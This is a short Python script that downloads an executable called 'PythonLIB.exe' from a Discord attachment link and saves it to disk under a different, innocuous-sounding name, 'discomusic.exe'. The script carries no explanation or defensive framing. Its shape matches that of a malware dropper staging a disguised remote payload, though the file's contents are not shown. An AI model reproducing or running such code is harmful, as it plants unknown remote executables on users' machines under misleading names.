import requests

file = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&")

with open("discomusic.exe", "wb") as f:
    f.write(file.content)

